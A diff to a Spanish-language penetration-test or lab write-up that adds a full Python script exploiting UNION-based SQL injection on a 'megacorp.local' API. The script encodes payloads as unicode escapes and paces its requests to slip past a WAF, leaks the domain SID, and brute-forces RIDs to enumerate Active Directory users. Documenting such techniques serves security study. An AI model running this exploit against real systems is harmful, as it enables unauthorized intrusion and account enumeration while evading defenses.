@@ -280,7 +280,7 @@ Ninguna de las combinaciones probadas resultó válida, lo que indica que las cr
 pertenecen a los usuarios enumerados previamente o que su ámbito de validez se restringe a otros servicios
 internos no expuestos en la superficie de ataque inicial.
 
-Domain User Enumeration
+<p align="center"><strong><u>Domain User Enumeration</u></strong></p>
 
 En  entornos  Active  Directory,  cada  entidad  de  seguridad  —usuarios,  grupos  y  equipos—  posee  un
 identificador  único  denominado  RID  (Relative  Identifier),  que  constituye  el  segmento  final  del  SID
@@ -289,43 +289,51 @@ contador incremental que asigna valores consecutivos a los objetos del dominio. 
 un usuario concreto permite inferir la estructura del SID y, por extensión, iterar sobre rangos completos de
 RIDs para identificar otros objetos del dominio mediante técnicas de enumeración lateral.
 
-19 de agosto de 2026
-
-14
+<img src="assets/31.jpg"> 
 
 SQL Server proporciona la función SUSER_SID(), que devuelve el SID asociado a un usuario determinado.
 Se  empleó  esta  función  para recuperar  el  SID del  administrador  primario  del  dominio.  Sin  embargo,  la
 salida se presentó en formato VARBINARY, y la conversión implícita realizada por la cláusula UNION
 generó una representación ilegible.
 
+<img src="assets/32.jpg"> 
+
 Para solventar esta limitación, se optó por exfiltrar el SID carácter por carácter, utilizando la columna id
 como  canal  de  retorno  y  determinando  previamente  la  longitud  total  del  SID  mediante  la  función
 DATALENGTH().
 
+<img src="assets/33.jpg"> 
+
 La función SUBSTRING() permitió extraer cada byte de forma individual. La primera consulta devolvió
 el valor 1, lo que implica que los dos primeros dígitos del SID son 01, un comportamiento coherente con la
 estructura estándar de los identificadores de seguridad en Windows.
+
+<img src="assets/33.jpg"> 
 
 A  partir  de  este  punto,  se  automatizó  el  proceso  mediante  un  script  que  incrementaba  la  posición  del
 substring para enumerar secuencialmente todos los bytes del SID. Durante la ejecución se observó que el
 servidor comenzaba a bloquear solicitudes tras varios intentos consecutivos, lo que sugiere la intervención
 de un WAF.
 
-19 de agosto de 2026
-
-15
+<img src="assets/34.jpg"> 
 
 Para  evitar  su  detección,  se  introdujo  un  retardo  de  dos  segundos  entre  cada  petición,  lo  que  permitió
 completar la exfiltración sin interrupciones. Una vez reconstruido el SID completo, se utilizó la función
 SUSER_SNAME() para realizar una resolución inversa y validar la identidad asociada.
 
+<img src="assets/35.jpg"> 
+
 La  consulta  devolvió  correctamente  MEGACORP\Administrator,  lo  que  confirmó  la  integridad  del
 proceso de exfiltración.
+
+<img src="assets/36.jpg"> 
 
 El SID obtenido tenía una longitud total de 56 bytes, de los cuales los primeros 48 bytes correspondían al
 SID del dominio, es decir, el identificador raíz a partir del cual se construyen todos los RIDs de objetos
 del bosque. Con esta información, fue posible comenzar a generar RIDs arbitrarios para enumerar usuarios
 del dominio de forma secuencial.
+
+<img src="assets/37.jpg"> 
 
 En Active Directory, cualquier objeto creado por administradores —y no por el propio sistema operativo—
 recibe un RID igual o superior a 1000. El análisis de los últimos ocho bytes del SID exfiltrado reveló el
@@ -333,20 +341,135 @@ valor f401, que, tras invertir el orden y convertirlo a entero, produce 500, el 
 Administrator por defecto. Este hallazgo confirmó la validez del método y permitió establecer el punto de
 partida para la enumeración sistemática de usuarios.
 
-19 de agosto de 2026
-
-16
-
 Con la estructura del SID del dominio plenamente reconstruida y el RID base identificado, se automatizó
 el proceso de bruteforce de RIDs a partir del valor 1000, con el objetivo de identificar usuarios adicionales
 del dominio mediante consultas sucesivas al motor SQL.
 
-19 de agosto de 2026
+```python
+#!/usr/bin/python3
 
-17
+import json
+import traceback, binascii
+import requests
+from time import sleep
+from impacket.dcerpc.v5.dtypes import SID
+import struct
+
+base_url = "http://megacorp.local/api/getColleagues"
+
+import sys, signal
+def exit_handler(sig, frame):
+	print("\n[!] Saliendo de la aplicacion...")
+	sys.exit(1)
+#evento para controlar la salida de la aplicacion con Ctrl+C
+signal.signal(signal.SIGINT, exit_handler)
+
+def convert_input(output):
+    '''
+    Funcion para convertir la consulta SQL a carateres unicode
+    '''       
+    # El modificador :02x asegura que siempre ocupe 2 espacios (ej: '0a' en vez de 'a')
+    utf = [f"\\u00{ord(i):02x}" for i in output]
+    
+    data_post = ''.join(utf)
+    return data_post
+
+def getdatasqli(sqili):
+    '''
+    Retorna datos filtrados de la base de datos mediante sql injection
+    '''
+    try:
+        sqli_unicode = convert_input(sqili)
+        post_data = '{"name":"%s"}' % sqli_unicode
+        headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+            "Content-type": "text/json; charset=utf-8"
+        }
+            
+        r = requests.post(base_url, headers=headers, data=post_data)
+        r.raise_for_status()
+
+        if r.status_code == 403:
+            print("Las peticiones estan siendo bloqueadas por el WAF")
+
+        data = json.loads(r.text)[0]["name"]
+        return data
+    except requests.exceptions.RequestException as e:
+        print(f"Error en la solicitud: {e}")
+        if e.response is not None:
+            if e.response.status_code == 403:
+                print("[+] Es posible que el WAF haya bloqueado las peticiones web. Esperando 30 segundos...")
+                sleep(30)
+                print("[+] Continuando enumeracion de usuarios...")
+
+def hex_to_sid(hex_str):
+    '''
+    Convierte el SID devuelto por la base de datos a un SID canonico
+    '''
+    if hex_str.lower().startswith('0x'):
+        hex_str = hex_str[2:]
+    
+    try:
+        return SID(bytes.fromhex(hex_str)).formatCanonical()
+    except ValueError as e:
+        
+        print(f"Error de formato hexadecimal: {e}")
+        
+    except struct.error as e:
+        
+        print(f"Error al parsear el SID con Impacket: {e}")
+    except Exception as e:
+        tipo_error = type(e).__name__
+        traza_completa = traceback.format_exc()
+        
+        mensaje_detalle = (
+            f"\n[!] Ocurrió un error de tipo: {tipo_error}\n"
+            f"[!] Mensaje del sistema: {e}\n"
+            f"[!] Detalles técnicos de la traza:\n"
+            f"{'-'*50}\n"
+            f"{traza_completa}"
+            f"{'-'*50}\n"
+        )
+        print(mensaje_detalle)
+    return None
+
+def main():
+    print("[+] Buscando un dominio valido")
+
+    #sqlinjection destinada a encontrar el nombre de dominio
+    sqilinjection = "test' union select 1,(select DEFAULT_DOMAIN()),3,4,5-- -"
+    domain = getdatasqli(sqilinjection)
+    print(f"[+] Dominio valido encontrado: {domain}")
+
+    #sql injection destinada a encontrar el SID del usuario
+    sqilinjection = f"test' union select 1,(master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\\Domain Admins'))),3,4,5-- -"
+    sid = getdatasqli(sqilinjection)
+    print(f"[+] SID valido encontrado: {sid[:-8]}")
+
+    '''
+    Buscando Usuarios en el dominio
+    '''
+    print("[+] Buscando usuarios en el dominio")
+    for i in range(500, 10001):
+        rid = binascii.hexlify(struct.pack("<I", i)).decode()
+        sid_completo = f"{sid[:-8]}{rid}"
+
+        sqilinjection = f"test' union select 1,(select SUSER_SNAME({sid_completo})),3,4,5-- -"
+        usuarios = getdatasqli(sqilinjection)
+
+        if usuarios:
+            print(f"SID: {hex_to_sid(sid_completo)} Usuario: {usuarios}")
+
+        sleep(2) #evita detecciones en el WAF
+    
+if __name__ == '__main__':
+    main()
+```
 
 Este  procedimiento  constituye  una  técnica  avanzada  de  enumeración  lateral  que  permite  reconstruir  la
 topología de identidades del dominio incluso en ausencia de privilegios directos sobre Active Directory.
+
+<img src="assets/38.jpg"> 
 
 Foothold
 
